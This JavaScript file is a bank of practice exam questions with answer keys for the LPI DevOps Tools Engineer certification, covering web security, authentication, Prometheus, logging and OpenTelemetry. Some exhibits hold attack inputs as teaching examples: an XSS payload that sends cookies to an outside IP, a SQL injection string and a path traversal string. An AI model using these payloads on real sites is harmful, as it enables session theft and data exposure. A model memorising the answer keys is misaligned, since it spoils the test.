// Domain 4 — Security and Observability (LPI 704.1-704.4). Original questions for LPI DevOps Tools Engineer 701-200 v2.0.
const L1 = '4.1-risks-appsec-cve';
const L2 = '4.1-crypto-authentication';
const L3 = '4.2-prometheus-architecture';
const L4 = '4.2-promql';
const L5 = '4.3-logging';
const L6 = '4.4-tracing-opentelemetry';

const bank = [
  // ---------- 704.1 -> topic 4.1 ----------
  { topic: '4.1', type: 'single', difficulty: 1, lesson: L1,
    stem: 'Attackers are submitting thousands of password guesses per minute against the login endpoint of an API. Which mitigation addresses this directly?',
    options: ['Rate limiting and account lockout or back-off, ideally with MFA', 'Enabling verbose error messages so users see why logins fail', 'Switching the API from HTTPS to HTTP to reduce overhead', 'Adding more replicas behind the load balancer'],
    answer: [0],
    explanation: 'This is a brute-force attack; throttling attempts, lockouts and a second factor make guessing impractical. Verbose errors help attackers, dropping TLS weakens security, and more replicas only add capacity for the attack traffic.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L1,
    stem: 'Refer to the exhibit. Which weakness does this production response show?',
    exhibit: `HTTP/1.1 500 Internal Server Error
Content-Type: text/html

java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax near ''' at line 1
    at com.example.webshop.OrderDao.find(OrderDao.java:88)
    at com.example.webshop.OrderController.show(OrderController.java:41)
Server: Apache Tomcat/9.0.31`,
    options: ['Verbose error reports that leak internals', 'Cross-site request forgery', 'A missing CORS header', 'An expired TLS certificate'],
    answer: [0],
    explanation: 'The client receives a stack trace, the SQL error, class names and the server version, which helps an attacker plan SQL injection. Production should show a generic error and log the details server-side. Nothing in the response relates to CSRF, CORS or certificates.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L1,
    stem: 'Refer to the exhibit. The search page echoes the query back into the HTML without encoding it. What vulnerability does this request exploit?',
    exhibit: `GET /search?q=<script>document.location='https://203.0.113.9/c?='+document.cookie</script> HTTP/1.1
Host: shop.example.com`,
    options: ['Cross-site scripting (XSS)', 'SQL injection', 'Buffer overflow', 'Denial of service'],
    answer: [0],
    explanation: 'Attacker-controlled script is reflected into the page and runs in the victim browser with the site privileges (here stealing cookies). Output encoding, a Content-Security-Policy and HttpOnly cookies mitigate it. The payload targets the browser, not a database, memory buffer or capacity.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L1,
    stem: 'Refer to the exhibit. Which input for the `id` parameter would make this code return every row of the orders table?',
    exhibit: `order_id = request.args["id"]
query = "SELECT * FROM orders WHERE id = " + order_id
cursor.execute(query)`,
    options: ['1 OR 1=1', '1; echo done', '<script>1</script>', '../../etc/passwd'],
    answer: [0],
    explanation: 'The input is concatenated into the SQL text, so `1 OR 1=1` makes the condition always true: SQL injection. Prepared statements with bound parameters prevent it. The script tag is an XSS payload, the path string is path traversal and the shell text is not interpreted by SQL.' },
  { topic: '4.1', type: 'single', difficulty: 1, lesson: L1,
    stem: 'A malicious site makes a logged-in user\'s browser send a state-changing request to shop.example.com, and the browser attaches the session cookie automatically. Which control is designed specifically to stop this?',
    options: ['Anti-CSRF tokens validated by the server (plus SameSite cookies)', 'Output encoding of user input', 'Parameterised database queries', 'Bounds checking in the C library'],
    answer: [0],
    explanation: 'This is cross-site request forgery. A per-session unpredictable token that the attacker cannot read, and SameSite cookies, stop forged requests. Output encoding addresses XSS, parameterised queries address SQL injection and bounds checking addresses buffer overflows.' },
  { topic: '4.1', type: 'fill', difficulty: 1, lesson: L1,
    stem: 'Type the name of the HTTP response header with which a server tells browsers which origin may read its response in a cross-origin request.',
    answer: ['Access-Control-Allow-Origin'],
    explanation: '`Access-Control-Allow-Origin` carries the permitted origin (or `*`). It is the central CORS response header; related headers such as `Access-Control-Allow-Methods` and `-Headers` refine it for preflighted requests.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L1,
    stem: 'Refer to the exhibit. JavaScript served from https://evil.example.net calls this API with fetch(). What happens in the browser?',
    exhibit: `> GET /api/orders HTTP/1.1
> Host: api.example.com
> Origin: https://evil.example.net

< HTTP/1.1 200 OK
< Access-Control-Allow-Origin: https://shop.example.com
< Vary: Origin
< Content-Type: application/json`,
    options: ['The request is sent, but the browser refuses to expose the response to the script', 'The server rejects the request with 403 before processing it', 'The browser silently retries the request using the allowed origin', 'The response is delivered because Vary: Origin permits all origins'],
    answer: [0],
    explanation: 'The origin of the page is not the one allowed by `Access-Control-Allow-Origin`, so the browser blocks the script from reading the answer. CORS is enforced by the browser; the server still processed the request and returned 200. `Vary: Origin` only tells caches the response depends on the Origin header.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L1,
    stem: 'Which statement about CORS and CSRF is correct?',
    options: ['CORS controls whether a page may read a cross-origin response; it does not stop a forged request from being sent, so it is not a CSRF defence', 'CORS prevents CSRF because the browser refuses all cross-origin requests', 'CSRF tokens are what the Access-Control-Allow-Origin header contains', 'CORS is enforced by the server firewall, not by the browser'],
    answer: [0],
    explanation: 'Browsers still send many cross-origin requests; CORS only governs read access. CSRF needs tokens or SameSite cookies. The CORS header holds an origin, not a token, and enforcement happens in the browser.' },
  { topic: '4.1', type: 'single', difficulty: 1, lesson: L1,
    stem: 'Which of the following is a correctly formed CVE identifier?',
    options: ['CVE-2024-12345', 'CVE-24-12345', 'CVE-2024-123', '2024-CVE-12345'],
    answer: [0],
    explanation: 'The format is `CVE-YYYY-NNNN` with a four-digit year and a sequence number of four or more digits. A two-digit year, a three-digit sequence and a reordered prefix are all invalid.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L1,
    stem: 'Refer to the exhibit. How is the first finding rated on the CVSS qualitative scale?',
    exhibit: `$ trivy image example/webshop:1.4.2
Library    Vulnerability   CVSS  Installed  Fixed
openssl    CVE-2025-11111  9.8   3.0.2      3.0.13
zlib       CVE-2024-22222  5.3   1.2.11     1.2.13`,
    options: ['Critical', 'High', 'Medium', 'Low'],
    answer: [0],
    explanation: '9.0 to 10.0 is Critical (7.0-8.9 High, 4.0-6.9 Medium, 0.1-3.9 Low). The 5.3 finding would be Medium.' },
  { topic: '4.1', type: 'fill', difficulty: 1, lesson: L1,
    stem: 'What is the highest possible CVSS base score? Type the number.',
    answer: ['10', '10.0'],
    explanation: 'CVSS scores range from 0.0 to 10.0, and 10.0 is the top of the Critical band.' },
  { topic: '4.1', type: 'multi', difficulty: 2, lesson: L1,
    stem: 'Which two measures reduce the risk that a known vulnerability in an internet-facing service is exploited? (Choose two.)',
    options: ['Apply security updates promptly', 'Restrict reachable ports with packet filtering', 'Show full stack traces to users', 'Keep all services on a single flat network', 'Disable log rotation'],
    answer: [0, 1],
    explanation: 'Patching removes the flaw and packet filtering reduces the attack surface. Stack traces leak details, a flat network helps lateral movement and disabling log rotation does nothing for exploitability.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L1,
    stem: 'Refer to the exhibit. Which change best protects the build against a base image that is silently replaced in the registry?',
    exhibit: `# Before
FROM registry.example.com/base/python:latest
# Candidates
#  A) FROM registry.example.com/base/python:3
#  B) FROM registry.example.com/base/python@sha256:4f0c...e91a
#  C) FROM registry.example.com/base/python:latest-slim
#  D) FROM python`,
    options: ['B: reference the image by its content digest', 'A: use a major-version tag', 'C: use the slim variant of latest', 'D: omit the registry host'],
    answer: [0],
    explanation: 'A digest identifies exact content, so a changed image cannot be pulled under the same reference. Tags such as `latest`, `3` and `latest-slim` are mutable pointers, and omitting the registry host defaults to a public registry, which is worse for supply chain control.' },
  { topic: '4.1', type: 'single', difficulty: 1, lesson: L2,
    stem: 'A sender wants to prove that a document came from them and was not altered. Which key do they use to create the digital signature?',
    options: ['Their own private key', 'Their own public key', 'The recipient\'s private key', 'A shared symmetric session key'],
    answer: [0],
    explanation: 'Signatures are made with the signer\'s private key and verified with the matching public key. The public key cannot produce a signature that verifies, the recipient\'s private key is not available to the sender, and a shared symmetric key would not prove who signed.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L2,
    stem: 'What does an X.509 certificate issued by a certificate authority state?',
    options: ['That a given public key belongs to a named subject, signed by the CA', 'That the server\'s private key is stored in the certificate', 'That the subject\'s password has been hashed with bcrypt', 'That all traffic to the host is encrypted with a shared secret'],
    answer: [0],
    explanation: 'A certificate binds identity information (such as the host name) to a public key and carries the CA\'s signature, which clients verify up a chain to a trusted root. It never contains the private key, passwords or session secrets.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L2,
    stem: 'An application needs to know who the user is after login and receives a signed JSON Web Token for that purpose. Which standard defines this ID token?',
    options: ['OpenID Connect', 'Plain OAuth 2.0 without extensions', 'SAML 2.0', 'RFC 6238'],
    answer: [0],
    explanation: 'OpenID Connect adds an authentication layer on OAuth 2.0 and issues an ID token as a JWT. Plain OAuth 2.0 delegates authorisation with access tokens, SAML uses XML assertions, and RFC 6238 defines TOTP.' },
  { topic: '4.1', type: 'match', difficulty: 2, lesson: L2,
    stem: 'Match each standard or mechanism to its main purpose.',
    pairs: [['OAuth 2.0', 'Delegated authorisation with access tokens'], ['OpenID Connect', 'Authentication with a JWT ID token'], ['SAML 2.0', 'SSO using signed XML assertions'], ['TOTP', 'Time-based one-time passwords for a second factor']],
    explanation: 'OAuth 2.0 grants limited access, OIDC identifies the user on top of it, SAML exchanges XML assertions between IdP and service provider, and TOTP generates short codes from a shared secret and the clock.' },
  { topic: '4.1', type: 'order', difficulty: 3, lesson: L2,
    stem: 'Put the steps of the OAuth 2.0 authorization code flow in the correct order.',
    items: ['The client redirects the user to the authorization endpoint', 'The user authenticates and consents', 'The authorization server redirects back with a code', 'The client exchanges the code at the token endpoint', 'The client calls the API with the access token'],
    explanation: 'The front channel carries the user and the short-lived code; the back channel token request returns the tokens; only then is the API called with the bearer access token.' },
  { topic: '4.1', type: 'single', difficulty: 3, lesson: L2,
    stem: 'Refer to the exhibit. After the user returns with an authorization code, what must the client send at the token endpoint to prove it started this flow?',
    exhibit: `GET /authorize?response_type=code&client_id=webshop
    &redirect_uri=https%3A%2F%2Fshop.example.com%2Fcb&scope=openid
    &state=af0ifjsldkj
    &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
    &code_challenge_method=S256 HTTP/1.1`,
    options: ['The original code_verifier from which the code_challenge was derived', 'The code_challenge again, unchanged', 'The ID token', 'The user\'s password'],
    answer: [0],
    explanation: 'With PKCE the client hashes a random `code_verifier` (S256) into the `code_challenge` and later sends the verifier; the server re-hashes and compares. Resending the challenge proves nothing, the ID token is the result of the exchange and the client never handles the user\'s password.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L2,
    stem: 'Refer to the exhibit. Which claim states for which application the token was issued, and must be checked by that application?',
    exhibit: `{
  "iss": "https://auth.example.com",
  "sub": "248289761001",
  "aud": "webshop",
  "exp": 1793000000,
  "iat": 1792996400
}`,
    options: ['aud', 'sub', 'iss', 'iat'],
    answer: [0],
    explanation: '`aud` (audience) names the intended recipient client. `sub` is the user identifier, `iss` the issuer and `iat` the issue time.' },
  { topic: '4.1', type: 'fill', difficulty: 1, lesson: L2,
    stem: 'By default, how many seconds is one TOTP time step (RFC 6238)? Type the number.',
    answer: ['30'],
    explanation: 'TOTP codes change every 30 seconds by default, derived from the shared secret and the current time step.' },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L2,
    stem: 'Which approach is the most appropriate way to store user passwords?',
    options: ['A unique salt per user with a slow hash such as Argon2, bcrypt or scrypt', 'Reversible encryption with a key stored next to the database', 'A single unsalted SHA-256 hash', 'Plain text protected by file permissions'],
    answer: [0],
    explanation: 'Slow, salted password hashes resist offline guessing and rainbow tables. Reversible encryption exposes all passwords if the key leaks, fast unsalted hashes are quickly brute-forced and plain text is unacceptable.' },
  { topic: '4.1', type: 'single', difficulty: 1, lesson: L2,
    stem: 'Which combination counts as two-factor authentication?',
    options: ['A password and a TOTP code from an authenticator app', 'A password and a security question', 'Two different passwords', 'A password and a PIN'],
    answer: [0],
    explanation: 'It combines something you know with something you have (the device holding the TOTP secret). A security question, a second password and a PIN are all "something you know", so they are one factor category.' },

  // ---------- 704.2 -> topic 4.2 ----------
  { topic: '4.2', type: 'single', difficulty: 1, lesson: L3,
    stem: 'How does Prometheus normally obtain metrics from a service?',
    options: ['It pulls them by scraping an HTTP /metrics endpoint at a fixed interval', 'The service pushes every sample to the Prometheus server', 'It reads the service log files over SSH', 'It receives them from Alertmanager'],
    answer: [0],
    explanation: 'Prometheus is pull-based: it scrapes targets. Pushing is limited to short-lived jobs via Pushgateway, it does not parse logs, and Alertmanager receives alerts from Prometheus, not the other way round.' },
  { topic: '4.2', type: 'fill', difficulty: 1, lesson: L3,
    stem: 'Type the default TCP port of the Prometheus server web UI and API.',
    answer: ['9090'],
    explanation: 'Prometheus listens on port 9090 by default.' },
  { topic: '4.2', type: 'fill', difficulty: 1, lesson: L3,
    stem: 'Type the default TCP port on which the Prometheus Node Exporter serves metrics.',
    answer: ['9100'],
    explanation: 'Node Exporter exposes host metrics at `/metrics` on port 9100.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L3,
    stem: 'A nightly backup script runs for 20 seconds and exits. How should its result metrics reach Prometheus?',
    options: ['Push them to a Pushgateway, which Prometheus then scrapes', 'Run Node Exporter inside the script', 'Configure Alertmanager to fetch them', 'Ask Grafana to store them'],
    answer: [0],
    explanation: 'Short-lived batch jobs may be gone before a scrape, so they push to the Pushgateway, which holds the last values for Prometheus to scrape. Node Exporter reports host metrics, Alertmanager handles alerts and Grafana only visualises.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L3,
    stem: 'Refer to the exhibit. Which metric type is this, and how would you obtain the 95th percentile of request duration?',
    exhibit: `# TYPE http_request_duration_seconds histogram
http_request_duration_seconds_bucket{le="0.1"} 240
http_request_duration_seconds_bucket{le="0.5"} 920
http_request_duration_seconds_bucket{le="1"} 990
http_request_duration_seconds_bucket{le="+Inf"} 1000
http_request_duration_seconds_sum 311.4
http_request_duration_seconds_count 1000`,
    options: ['A histogram; compute it on the server with histogram_quantile()', 'A counter; apply avg_over_time()', 'A gauge; read the _sum series directly', 'A summary; read the quantile label'],
    answer: [0],
    explanation: 'Cumulative `_bucket{le=...}` series with `_sum` and `_count` are a histogram, and `histogram_quantile(0.95, ...)` estimates percentiles from the buckets. A summary exposes `quantile` labels instead; the series are not a plain counter or gauge.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L3,
    stem: 'Why can histogram quantiles be aggregated across many instances while summary quantiles cannot?',
    options: ['Histogram buckets are counters that can be summed, whereas summary quantiles are precomputed per instance and cannot be averaged meaningfully', 'Summaries store no data, so there is nothing to aggregate', 'Histograms are only available on a single instance', 'Summaries are always gauges'],
    answer: [0],
    explanation: 'Buckets from different instances can be added together (`sum by (le)`) and the quantile calculated afterwards. A summary quantile is computed client-side and the combination of several quantiles is not the quantile of the combination.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L3,
    stem: 'Refer to the exhibit. A new entry is added to /etc/prometheus/targets/shop.json while Prometheus is running. What happens?',
    exhibit: `scrape_configs:
  - job_name: webshop
    file_sd_configs:
      - files:
          - /etc/prometheus/targets/*.json
        refresh_interval: 5m`,
    options: ['Prometheus picks up the change without a restart', 'The change is ignored until Prometheus is restarted', 'The change requires sending the file to Alertmanager', 'Only targets listed under static_configs are ever scraped'],
    answer: [0],
    explanation: 'File-based service discovery watches the files and applies changes automatically; `refresh_interval` is a periodic re-read as a fallback. No restart is required, and Alertmanager plays no part in target discovery.' },
  { topic: '4.2', type: 'fill', difficulty: 1, lesson: L3,
    stem: 'In a `file_sd_configs` block, type the key that lists the paths of the target files.',
    answer: ['files'],
    explanation: '`files` takes a list of file paths or patterns (JSON or YAML) containing target groups; `refresh_interval` is the separate re-read interval.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L3,
    stem: 'Refer to the exhibit. Which `job` label does the series for the target 10.0.0.12:9100 get?',
    exhibit: `scrape_configs:
  - job_name: prometheus
    static_configs:
      - targets: ['localhost:9090']
  - job_name: node
    static_configs:
      - targets: ['10.0.0.11:9100', '10.0.0.12:9100']`,
    options: ['node', 'prometheus', '10.0.0.12', 'node-exporter'],
    answer: [0],
    explanation: 'Prometheus attaches `job` from the `job_name` of the scrape config that contains the target; `instance` is `10.0.0.12:9100`. The other values do not appear in the configuration.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L3,
    stem: 'Refer to the exhibit. Which labels does the series `up{instance="10.0.0.31:8080"}` carry for the job `webshop` that uses this file?',
    exhibit: `[
  { "targets": ["10.0.0.31:8080", "10.0.0.32:8080"],
    "labels": { "env": "prod", "team": "shop" } }
]`,
    options: ['job="webshop", instance="10.0.0.31:8080", env="prod" and team="shop"', 'Only job and instance; labels in the file are ignored', 'Only env and team', 'None until relabel_configs is added'],
    answer: [0],
    explanation: 'Labels in a file_sd target group are applied to each of its targets in addition to the automatic `job` and `instance` labels. No relabelling is needed to keep them.' },
  { topic: '4.2', type: 'single', difficulty: 1, lesson: L4,
    stem: 'Refer to the exhibit. Why does Prometheus reject this query?',
    exhibit: `rate(http_requests_total)`,
    options: ['rate() requires a range vector such as http_requests_total[5m]', 'rate() works only on gauges', 'The metric name must be quoted', 'rate() needs a by clause'],
    answer: [0],
    explanation: '`rate`, `irate` and `increase` need a range vector (a `[duration]` selector). They are meant for counters, not gauges, metric names are unquoted, and `by` belongs to aggregation operators.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L4,
    stem: 'What is the difference between rate() and irate()?',
    options: ['rate() averages over the whole window; irate() uses only the last two samples in it', 'rate() works on gauges; irate() works on counters', 'rate() returns totals; irate() returns per-second values', 'There is none; irate() is the old name'],
    answer: [0],
    explanation: '`rate` gives the per-second average over the window and is preferred for alerts; `irate` is the instantaneous rate from the last two points and is spikier. Both are per-second and both are for counters. `increase` returns the total.' },
  { topic: '4.2', type: 'fill', difficulty: 2, lesson: L4,
    stem: 'Type the PromQL aggregation clause keyword that keeps all labels except those listed (instead of `by`).',
    answer: ['without'],
    explanation: '`sum without (instance) (...)` removes only `instance` and keeps the other labels; `sum by (job) (...)` keeps only `job`.' },
  { topic: '4.2', type: 'fill', difficulty: 2, lesson: L4,
    stem: 'Type the PromQL label matcher operator that selects series whose label value does NOT match a regular expression.',
    answer: ['!~'],
    explanation: 'The four matchers are `=`, `!=`, `=~` (regex match) and `!~` (regex does not match).' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L4,
    stem: 'Refer to the exhibit. What does this query return?',
    exhibit: `avg_over_time(node_load1[1h])`,
    options: ['For each series, the average of its samples over the last hour', 'The average across all instances at the current moment', 'The per-second rate of node_load1', 'A range vector of the last hour of samples'],
    answer: [0],
    explanation: '`avg_over_time` reduces a range vector to an instant vector by averaging across time per series. Averaging across series would be `avg(...)`, the per-second rate is `rate`, and the result is an instant vector, not a range vector.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L4,
    stem: 'Refer to the exhibit. What does this query compute?',
    exhibit: `histogram_quantile(0.99,
  sum by (le) (rate(http_request_duration_seconds_bucket[5m])))`,
    options: ['The 99th percentile request duration over the last 5 minutes across all instances', 'The share of requests slower than 0.99 seconds', 'The 5-minute average of the _sum series', 'The number of buckets with 99 or more observations'],
    answer: [0],
    explanation: 'The bucket rates are summed per `le` across instances and `histogram_quantile` estimates the 0.99 quantile from them. The 0.99 is a quantile, not a duration.' },
  { topic: '4.2', type: 'fill', difficulty: 1, lesson: L3,
    stem: 'Type the name of the metric that Prometheus records for every scraped target: 1 when the scrape succeeded, 0 when it failed.',
    answer: ['up'],
    explanation: 'The synthetic metric `up{job=...,instance=...}` is the basis of the usual `up == 0` alert.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L3,
    stem: 'Which statement about Alertmanager inhibition and silences is correct?',
    options: ['Inhibition mutes alerts while another matching alert is firing; a silence mutes alerts matching given matchers for a set time', 'A silence mutes alerts while another alert fires; inhibition is set manually for a time period', 'Both delete the alerts from Prometheus', 'Inhibition combines alerts into one notification; silences route them to another receiver'],
    answer: [0],
    explanation: 'Inhibition is rule-based (for example mute service alerts while the node-down alert fires); silences are manual and time-limited. Neither deletes alerts in Prometheus, and combining alerts is grouping, not inhibition.' },
  { topic: '4.2', type: 'multi', difficulty: 2, lesson: L3,
    stem: 'Which three functions does Alertmanager perform? (Choose three.)',
    options: ['Grouping related alerts into one notification', 'Inhibiting alerts while a more important one fires', 'Silencing alerts temporarily', 'Scraping targets', 'Storing time series for months'],
    answer: [0, 1, 2],
    explanation: 'Alertmanager groups, inhibits, silences and routes notifications. Scraping and sample storage belong to the Prometheus server (and Thanos for long-term retention).' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L3,
    stem: 'What does Thanos add to a Prometheus setup?',
    options: ['Long-term storage in object storage and a global query view across many Prometheus servers', 'Log aggregation with label indexing', 'Distributed tracing with spans', 'Alert routing to chat receivers'],
    answer: [0],
    explanation: 'Thanos components (Sidecar, Store Gateway, Querier, Compactor) provide long-term retention and one query layer over multiple Prometheus instances. Log aggregation is Loki, tracing is Jaeger or Tempo and alert routing is Alertmanager.' },
  { topic: '4.2', type: 'match', difficulty: 2, lesson: L3,
    stem: 'Match each Prometheus ecosystem component to its role.',
    pairs: [['Node Exporter', 'Exposes host CPU, memory and disk metrics on port 9100'], ['Blackbox Exporter', 'Probes endpoints from outside over HTTP, TCP, ICMP or DNS'], ['Pushgateway', 'Holds metrics pushed by short-lived batch jobs'], ['Alertmanager', 'Groups, silences and routes alert notifications'], ['Grafana', 'Dashboards that query Prometheus']],
    explanation: 'Each tool has one job: host metrics, external probes, batch job results, alert handling and visualisation.' },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L3,
    stem: 'Which of these is an indicator of logical (business) functionality rather than technical functionality?',
    options: ['Orders completed per minute', 'CPU utilisation of a node', 'Disk space used by /var', 'Container restart count'],
    answer: [0],
    explanation: 'A service can be up with healthy CPU and still fail to complete orders; the order rate shows whether it does its job. The others are technical resource or platform indicators.' },

  // ---------- 704.3 -> topic 4.3 ----------
  { topic: '4.3', type: 'single', difficulty: 3, lesson: L5,
    stem: 'Refer to the exhibit. The leading <34> is the syslog priority value (facility x 8 + severity). Which facility and severity does it encode?',
    exhibit: `<34>Oct 30 09:14:15 web01 sshd[2211]: Failed password for root from 192.0.2.77 port 51022 ssh2`,
    options: ['Facility auth (4), severity crit (2)', 'Facility user (1), severity err (3)', 'Facility daemon (3), severity warning (4)', 'Facility kern (0), severity emerg (0)'],
    answer: [0],
    explanation: '34 = 4 x 8 + 2, so facility 4 (`auth`) and severity 2 (`crit`). The other pairs give 11, 28 and 0 respectively.' },
  { topic: '4.3', type: 'single', difficulty: 2, lesson: L5,
    stem: 'Which command shows only messages of priority err or more severe from the current boot on a systemd host?',
    options: ['journalctl -b -p err', 'journalctl --since err', 'cat /var/log/journal', 'journalctl -u err -f'],
    answer: [0],
    explanation: '`-b` limits to the current boot and `-p err` to that priority and worse. `--since` takes a time, `/var/log/journal` is a binary directory, and `-u` selects a unit, not a priority.' },
  { topic: '4.3', type: 'fill', difficulty: 1, lesson: L5,
    stem: 'Type the journalctl option that follows new journal entries as they arrive (like tail -f). Use the short form.',
    answer: ['-f'],
    explanation: '`journalctl -f` (long form `--follow`) streams new entries, often combined with `-u UNIT`.' },
  { topic: '4.3', type: 'fill', difficulty: 1, lesson: L5,
    stem: 'Type the standard port number on which syslog messages are sent over the network (UDP, or TCP).',
    answer: ['514'],
    explanation: 'Classic syslog uses port 514; rsyslog can listen on UDP or TCP 514 and forward with `@` (UDP) or `@@` (TCP).' },
  { topic: '4.3', type: 'single', difficulty: 2, lesson: L5,
    stem: 'Refer to the exhibit. What does this Grafana Loki query do?',
    exhibit: `{app="webshop", env="prod"} |= "error" != "healthcheck"`,
    options: ['Selects the log streams with those labels and keeps lines containing "error" but not "healthcheck"', 'Returns the metric error for the webshop job', 'Searches all logs in the cluster by full-text index only', 'Deletes lines containing "healthcheck"'],
    answer: [0],
    explanation: 'This is LogQL: a label stream selector followed by line filters (`|=` contains, `!=` does not contain). Metrics use PromQL, Loki does not full-text index everything, and queries never delete data.' },
  { topic: '4.3', type: 'match', difficulty: 2, lesson: L5,
    stem: 'Match each logging tool to its role.',
    pairs: [['Filebeat', 'Lightweight shipper that tails files'], ['Logstash', 'Input, filter and output pipeline that parses and enriches events'], ['Kibana', 'Web UI over Elasticsearch'], ['Loki', 'Log store that indexes only labels'], ['Graylog', 'Integrated log management platform with its own web UI']],
    explanation: 'Beats ship, Logstash processes, Elasticsearch stores and Kibana shows (ELK); Loki is Grafana\'s label-indexed store and Graylog is a self-contained platform that uses OpenSearch/Elasticsearch for storage.' },
  { topic: '4.3', type: 'single', difficulty: 2, lesson: L5,
    stem: 'What is the status of Promtail, the original Loki log agent?',
    options: ['It is deprecated; Grafana Alloy is the successor collector', 'It is the only supported way to feed Loki and is being expanded', 'It was merged into Logstash', 'It is only for Elasticsearch'],
    answer: [0],
    explanation: 'Grafana deprecated Promtail and recommends Grafana Alloy for new deployments. Logstash and Elasticsearch are a different stack.' },

  // ---------- 704.4 -> topic 4.4 ----------
  { topic: '4.4', type: 'single', difficulty: 2, lesson: L6,
    stem: 'Refer to the exhibit. Which part of this W3C header is the trace ID?',
    exhibit: `traceparent: 00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01`,
    options: ['0af7651916cd43dd8448eb211c80319c', 'b7ad6b7169203331', '00', '01'],
    answer: [0],
    explanation: 'The format is version-traceid-parentid-flags. The 32-hex-character trace ID (16 bytes) is second; the 16-hex-character item is the parent span ID, `00` the version and `01` the flags (sampled).' },
  { topic: '4.4', type: 'fill', difficulty: 1, lesson: L6,
    stem: 'Type the default port on which an OpenTelemetry Collector OTLP receiver accepts gRPC.',
    answer: ['4317'],
    explanation: 'OTLP over gRPC uses 4317 and OTLP over HTTP uses 4318.' },
  { topic: '4.4', type: 'fill', difficulty: 1, lesson: L6,
    stem: 'Type the name of the W3C Trace Context HTTP header that carries the trace ID, parent span ID and flags.',
    answer: ['traceparent'],
    explanation: '`traceparent` carries the core context; the optional `tracestate` carries vendor data.' },
  { topic: '4.4', type: 'single', difficulty: 2, lesson: L6,
    stem: 'Refer to the exhibit. What can you conclude about this span?',
    exhibit: `{
  "traceId": "0af7651916cd43dd8448eb211c80319c",
  "spanId": "b7ad6b7169203331",
  "parentSpanId": "",
  "name": "POST /checkout",
  "kind": "SPAN_KIND_SERVER",
  "status": { "code": "STATUS_CODE_ERROR" }
}`,
    options: ['It is the root span of the trace, handled on the server side, and ended in error', 'It is a child span created by a CLIENT call', 'It is a PRODUCER span with status Ok', 'It is a link to a span in another trace'],
    answer: [0],
    explanation: 'An empty `parentSpanId` marks the root span, kind SERVER means it handles an incoming request and the status code is Error. It is not a child, producer or link.' },
  { topic: '4.4', type: 'multi', difficulty: 2, lesson: L6,
    stem: 'Which three kinds of components are configured in an OpenTelemetry Collector pipeline? (Choose three.)',
    options: ['Receivers', 'Processors', 'Exporters', 'Shards', 'Schedulers'],
    answer: [0, 1, 2],
    explanation: 'Data enters through receivers, is transformed by processors (such as `batch`) and leaves through exporters, wired together in `service.pipelines`. Shards and schedulers are not Collector components.' },
  { topic: '4.4', type: 'single', difficulty: 2, lesson: L6,
    stem: 'A worker takes a message from a queue and processes it. Which span kind should the processing span have?',
    options: ['CONSUMER', 'PRODUCER', 'CLIENT', 'SERVER'],
    answer: [0],
    explanation: 'CONSUMER spans process a message from an asynchronous broker. PRODUCER creates or enqueues the message; CLIENT and SERVER are for synchronous request/response calls.' },
  { topic: '4.4', type: 'single', difficulty: 3, lesson: L6,
    stem: 'Refer to the exhibit. The Collector starts without errors, but no traces ever arrive in Tempo. What is the problem?',
    exhibit: `receivers:
  otlp:
    protocols:
      grpc:
processors:
  batch:
exporters:
  otlp/tempo:
    endpoint: tempo.example.com:4317
  debug:
service:
  pipelines:
    traces:
      receivers: [otlp]
      processors: [batch]
      exporters: [debug]`,
    options: ['The traces pipeline does not reference the otlp/tempo exporter, so nothing is sent to Tempo', 'The batch processor drops all spans', 'Port 4317 is HTTP, not gRPC', 'Receivers cannot be named otlp'],
    answer: [0],
    explanation: 'Components are only active when a pipeline references them; an exporter that no pipeline lists is never used, and this pipeline only writes to the `debug` exporter, so it needs `exporters: [otlp/tempo]`. `batch` only groups spans, 4317 is the gRPC port and `otlp` is the standard receiver name.' },
];

export default bank.map((item, i) => ({ id: `d4-${String(i + 1).padStart(3, '0')}`, ...item }));
